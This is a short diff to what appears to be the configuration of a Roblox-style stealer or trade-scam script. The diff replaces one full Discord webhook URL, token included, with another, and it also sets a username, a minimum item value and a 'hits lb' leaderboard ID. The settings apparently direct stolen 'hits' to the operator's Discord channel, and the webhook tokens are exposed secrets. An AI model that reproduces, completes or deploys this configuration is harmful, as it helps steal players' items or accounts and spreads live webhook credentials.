@@ -1,5 +1,5 @@
 Username = "JerwinWatching"
-Webhook = "https://discord.com/api/webhooks/1404816676138258666/wdeD_gGXQ6oynF0g2APBTxAIBJercxAPqgpTGTd7sgA4_dpRm5hAYrR_TQxhX10-Tm8b"
+Webhook = "https://discord.com/api/webhooks/1408273467312181328/20sWt8l8lEmwscTQg7DWrFWbWvUKkQzRGew-41je15HwAIo4DW5RhXYZwkatYpYNd3RM"
 MinimumValue = 10000
 DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
